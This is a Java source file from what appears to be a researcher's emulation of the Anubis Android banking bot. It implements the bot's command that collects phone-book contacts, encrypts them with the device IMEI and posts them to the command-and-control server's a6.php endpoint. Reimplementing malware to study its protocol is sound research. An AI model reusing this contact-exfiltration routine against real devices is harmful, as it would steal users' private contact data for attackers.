/*
 * Copyright (C) 2020 Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package anubis.commands;

import bot.network.Connector;
import anubis.bot.AnubisBot;
import device.Contact;
import java.util.List;

/**
 * This class handles the command to upload all contacts to the C2
 *
 * @author Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 */
public class GetPhoneBookNumbers {

    /**
     * This class handles the command to upload all contacts to the C2
     *
     * @param bot the bot
     * @throws Exception if a HTTP request fails
     */
    public GetPhoneBookNumbers(AnubisBot bot) throws Exception {
        String log = "Received command to get all contacts";
        bot.addLog(log);

        //Only enter this routine if getNumber == true in the shared preferences
        String result = "(" + bot.getPhone().getLocale() + ") Numbers from the phone book";

        Connector connector = bot.getConnector();

        List<Contact> contacts = bot.getPhone().getContacts();
        for (Contact contact : contacts) {
            String name = contact.getName();
            String number = contact.getNumber();

            if ((!number.contains("*")) && (!number.contains("#")) && (number.length() > 6) && (!result.contains(number))) {
                result = result + number + "     " + name + "</br>" + '\n';
            }
            String url = bot.getServer() + "/" + bot.getServerFolder() + "/a6.php";
            String parameter = "p=" + bot.getEncryptionHandler().encrypt(bot.getPhone().getImei() + "|" + result + "|");
            String response = connector.post(url, parameter);

            //Sets the getNumber value to true in the shared preferences
            bot.getPhone().getSharedPreferences().write("getNumber", "true");
            if (response.contains("||ok||")) {
                log = "Responded to the server with all contacts within the current configuration";
            } else {
                log = "Server failed to respond properly to the uploaded contacts";
            }
            bot.addLog(log);
            //Returns ||ok|| if received or empty if an error occurs
        }
    }
}
